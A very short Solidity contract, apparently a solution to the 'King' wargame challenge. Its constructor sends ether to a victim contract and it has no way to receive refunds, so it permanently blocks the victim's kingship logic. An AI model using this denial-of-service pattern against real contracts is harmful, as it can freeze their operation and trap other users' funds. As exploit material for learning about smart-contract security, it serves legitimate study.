// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract AttackKing {
    address payable king;
    uint256 public prize;
    address payable public owner;

    constructor(address _victim) public payable {
        address(_victim).call{value: msg.value}("");
    }
}
